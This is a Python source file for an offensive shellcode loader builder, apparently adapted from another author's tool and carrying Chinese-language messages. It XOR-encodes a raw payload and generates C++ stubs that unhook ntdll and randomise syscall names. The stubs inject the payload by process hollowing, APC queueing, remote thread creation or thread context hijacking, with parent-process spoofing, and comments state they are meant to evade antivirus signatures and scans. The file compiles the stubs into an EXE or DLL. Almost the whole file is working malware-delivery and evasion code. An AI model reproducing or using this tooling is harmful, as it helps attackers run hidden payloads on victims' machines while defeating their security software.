#!/usr/bin/python3
# Matthew David (@icyguider)
import sys, os, argparse, random, string
from time import sleep
sys.path.append("..")

class DAZZLINGCOLORS:
    OKPINK = '\033[95m'       # pink
    OKBLUE = '\033[94m'       # blue
    OKGREEN = '\033[92m'      # green
    OKYELLOW = '\033[93m'      # yellow
    OKRED = '\033[91m'         # red
    OKBLACK = '\033[0m'          # black
    BLACKBOLD = '\033[1m'          # black+bold
    UNDERLINE = '\033[4m'     # black+underline
graphical = DAZZLINGCOLORS.OKPINK + """
            t#,                              ,;                           t#,                     
t         ;##W.                           f#i j.                    i   ;##W.             
ED.      :#L:WE             ;           .E#t  EW,                  LE  :#L:WE         
E#K:    .KG  ,#D          .DL          i#W,   E##j                L#E .KG  ,#D         
E##W;   EE    ;#f f.     :K#L     LWL L#D.    E###D.             G#W. EE    ;#f       
E#E##t f#.     t#iEW:   ;W##L   .E#f:K#Wfff;  E#jG#W;           D#K. f#.     t#i      
E#ti##f:#G     GK E#t  t#KE#L  ,W#; i##WLLLLt E#t t##f         E#K.  :#G     GK     
E#t ;##D;#L   LW. E#t f#D.L#L t#K:   .E#L     E#t  :K#E:     .E#E.    ;#L   LW.     
E#ELLE##Kt#f f#:  E#jG#f  L#LL#G       f#E:   E#KDDDD###i   .K#E       t#f f#:    
E#L;;;;;;,f#D#;   E###;   L###j         ,WW;  E#f,t#Wi,,,  .K#D         f#D#;   
E#t        G#t    E#K:    L#W;           .D#; E#t  ;#W:   .W#G           G#t   
E#t         t     EG      LE.              tt DWi   ,KK: :W##########Wt   t                                                     
"""
unhook_api = """
void DoEvil() {
	return;
}

static int Unhook() {
	HANDLE pollutedNtdll;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID hMapping;

	//get handle of pollutted ntdll.dll

	LPCSTR Ntdll = "ntdll.dll";
	pollutedNtdll = GetModuleHandleA(Ntdll);

	LPCSTR NtdllPath = "c:\\\windows\\\system32\\\wwwwwwwwwwwwntdll.dll";
	
	// open fresh copy of ntdll.dll and map a view of it

	hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		CloseHandle(hFile);
		return -1;
	}

	hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!hMapping) {
		CloseHandle(hFile);
		CloseHandle(hFileMapping);
		return -1;
	}

	// find .text section of ntdll

	IMAGE_DOS_HEADER * hImgDosHeader = (IMAGE_DOS_HEADER * )hMapping;
	IMAGE_NT_HEADERS* hImgNtHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
	IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
	IMAGE_SECTION_HEADER* hImgSecHeader = (IMAGE_SECTION_HEADER*)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
	DWORD oldprotect = 0;

	for (int i = 0; i < hImgFileHeader.NumberOfSections; i++) {
		if (!strcmp((char*)hImgSecHeader[i].Name, ".text")) {
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			return 0;
		}
	}
	return -1;
}

"""

stub = """
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "Syscalls2.h"
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_ME_PAYLOAD

unsigned int payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

//REPLACE_SANDBOX_CHECK

//REPLACE_PROCESS_FUNCTIONS

int deC(unsigned char payload[])
{
    std::string key;
    key = "REPLACE_ME_KEY";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}
RETURN_UNHOOKAPI

int main()
{
    
    REPLACE_STUB_METHOD
}

REPLACE_DLLMAIN
"""



process_functions = """
HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}
"""

process_hollow_stub = """
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);

    if (res != 0){
        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
    }

    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
        std::cout << "nBytes: " << nBytes << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
    }
    
    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
    PVOID entrypointAddress = (PVOID)rvaconv2;

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = (SIZE_T)payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtResumeThread(hThread, &tmp);
    if (res != 0){
        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

CurrentThread_stub = """
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
    NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtResumeThread(thandle, 0);

    if (res != 0){
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    res = NtWaitForSingleObject(thandle, -1, NULL);   
"""

QueueUserAPC_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);

    if (res != 0){
        std::cout << "NtQueueApcThread FAILED to add routine to APC queue: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtQueueApcThread added routine to APC queue successfully." << std::endl;
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0){
        std::cout << "NtAlertResumeThread FAILED to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtAlertResumeThread resumed thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

RemoteThreadSuspended_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    HANDLE hProcess = NULL;
    SIZE_T bytesWritten;
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "REPLACE_ME_PROCESS") == 0)
            {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
                cid.UniqueThread = 0;
                cid.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (res != 0){
                    std::cout << "NtOpenProcess FAILED to open the target process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtOpenProcess opened the target process sucessfully." << std::endl;
                }

                res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (res != 0){
                    std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
                    return 0;
                }
                else {
                    std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
                }

                res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

                if (res != 0){
                    std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
                }

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);

                if (res != 0){
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);

                if (res != 0){
                    std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
                }

                std::cout << "Sleeping for 10 seconds to avoid in-memory AV scan..." << std::endl;
                Sleep(10000);

                res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

                if (res != 0){
                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
                }

                res = NtResumeThread(thandle, 0);

                if (res != 0){
                    std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
                    return 0;
                }
                else{
                    std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
                }

                NtClose(hProcess);
                NtClose(thandle);
            }
        }
    }

    NtClose(snapshot);
"""

RemoteThreadContext_stub = """
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;
/*
    //REPLACE_ME_SANDBOX_CALL
    */
    deC(payload);
    if (!Unhook()) {
		std::cout << "ntdll unhooked!" << std::endl;
		DoEvil();
	}

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
    }

    void *_loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
    if (_loadLibrary == NULL) {
        std::cout << "[X] Error: Could not find address of LoadLibrary" << std::endl;
        return 0;
    }

    HANDLE hThread;

    res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

    if (res != 0){
        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL;

    res = NtGetContextThread(hThread, &ctx);

    if (res != 0){
        std::cout << "NtGetContextThread FAILED to get context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtGetContextThread got context of thread successfully." << std::endl;
    }

    ctx.Rip = (DWORD64)base_addr;

    res = NtSetContextThread(hThread, &ctx);

    if (res != 0){
        std::cout << "NtSetContextThread FAILED to set context of thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtSetContextThread set context of thread successfully." << std::endl;
    }

    res = NtResumeThread(hThread, 0);

    if (res != 0){
        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
    }

    NtClose(hProcess);
    NtClose(hThread);
"""

invoke_sandbox_check = """
    if (CheckSandbox()) {
        std::cout << "Sandbox checks failed; exiting." << std::endl;
        return 0;
    }

    std::cout << "Sandbox checks passed" << std::endl;
"""

Dll_Main = """
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    //HANDLE threadhandle;
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            main();
            //threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
            //CloseHandle(threadhandle);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""

def generateKey(length):
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(length))
    return key

def generateRandomSyscall(length):
    letters = string.ascii_letters
    syscall = ''.join(random.choice(letters) for i in range(length))
    return syscall

def main(stub, infile, outfile, key, process, method, no_randomize, verbose, dll):
    print("[+] 基于syswhispers的shellcode加载器")
    method = method.lower()
    file_size = os.path.getsize(infile)
    if file_size > 10000 and method == "processhollow":
        print("[+] 检测到Stageless payload，即用QueueUserAPC 注入")
        method = "queueuserapc"
    if method == "processhollow":
    
        with open(infile, 'rb') as contents:
            save = contents.read()
        tempfile = "temp_{}".format(infile)
        with open(tempfile, 'wb') as contents:
            contents.write(b"\x90"*5000)
            contents.write(save)
        file = open(tempfile, 'rb')
        contents = file.read()
        file.close()
        os.system("rm {}".format(tempfile))
    else:
        file = open(infile, 'rb')
        contents = file.read()
        file.close()

    encrypted = []
    for b in range(len(contents)):
        test = contents[b]
        for i in range(len(key)):
            test = test ^ ord(key[i])
        encrypted.append("{:02x}".format(test))

    output = "unsigned char payload[] = {"

    count = 0
    for x in encrypted:
        if count < len(encrypted)-1:
            output += "0x{},".format(x)
        else:
            output += "0x{}".format(x)
        count += 1

    output += "};"



    stub = stub.replace("REPLACE_ME_PAYLOAD", output)
    stub = stub.replace("REPLACE_ME_KEY", key)

    if method == "processhollow":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", process_hollow_stub)
        print("[+] 使用 {} 进行傀儡进程注入".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "queueuserapc":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", QueueUserAPC_stub)
        print("[+] 使用 {} 进行QueueUserAPC进程注入".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadsuspended":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadSuspended_stub)
        print("[+] 使用{} 进行RemoteThreadSuspended进程注入".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "remotethreadcontext":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
        stub = stub.replace("REPLACE_STUB_METHOD", RemoteThreadContext_stub)
        print("[+] 使用{} 进行RemoteThreadContext进程注入".format(process))
        stub = stub.replace("REPLACE_ME_PROCESS", process)
    if method == "currentthread":
        stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", "")
        stub = stub.replace("REPLACE_STUB_METHOD", CurrentThread_stub)


    a = ""
    stub = stub.replace("RETURN_UNHOOKAPI", unhook_api)
    stub = stub.replace("wwwwwwwwwwww", a)
    
    
    if dll == True:
        stub = stub.replace("REPLACE_DLLMAIN", Dll_Main)
    
    else:
        stub = stub.replace("REPLACE_DLLMAIN", a)
    #随机化系统调用名称

    f = open("Syscalls.h", "r")
    syscall_contents = f.read()
    f.close()
    if no_randomize != True:
        print("[+] 随机化系统调用名称")
        name_len = 19
        syscalls = ["NtQueryInformationProcess", "NtReadVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtResumeThread", "NtClose", "NtOpenProcess", "NtCreateThreadEx", "NtAllocateVirtualMemory", "NtWaitForSingleObject", "NtQueueApcThread", "NtAlertResumeThread", "NtGetContextThread", "NtSetContextThread", "NtDelayExecution"]
        for syscall in syscalls:
            random_syscall = generateRandomSyscall(name_len)
            syscall_contents = syscall_contents.replace(syscall, random_syscall)
            stub = stub.replace(syscall, random_syscall)
    #print(syscall_contents)
    f = open("Syscalls2.h", "w")
    f.write(syscall_contents)
    f.close()

    if verbose == True:
        print("[+] 启用详细消息")
        sleep(1)

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] 将新存根保存到 stub.cpp")
    sleep(1)
    print("[+] 编译新存根...")
    if verbose == True:
        os.system("""x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o "{}"\n""".format(outfile))
    else:
        os.system("""x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o "{}"\n""".format(outfile))
    if dll ==True:
        os.system("""x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o "{}"\n""".format(outfile))
    
    
    if os.path.exists(outfile) == True:
        sleep(1)
        print("[!] {} 已经编译成功！".format(outfile))
    else:
        sleep(1)
        print("[!] 存根编译失败！真的烦！")
    #os.system("del stub.cpp")
    #os.system("del Syscalls2.h")


print(graphical)
parser = argparse.ArgumentParser(description='基于syswhispers的shellcode加载器')
parser.add_argument("file", help="包含raw格式的shellcode格式文件", type=str)
parser.add_argument('-p', '--process', dest='process', help='注入的进程(默认: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
parser.add_argument('-m', '--method', dest='method', help='shellcode注入模式(Options: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread) (默认: QueueUserAPC)', metavar='QueueUserAPC', default='QueueUserAPC')
parser.add_argument('-nr', '--no-randomize', action='store_true', help='禁用系统调用名称随机化')
parser.add_argument('-v', '--verbose', action='store_true', help='执行时启用调试消息')
#parser.add_argument('-s', '--sandbox', action='store_true', help='通过加载的 DLL 枚举逃避沙箱')
parser.add_argument('-d', '--dll', action='store_true', help='Generate a DLL instead of EXE')
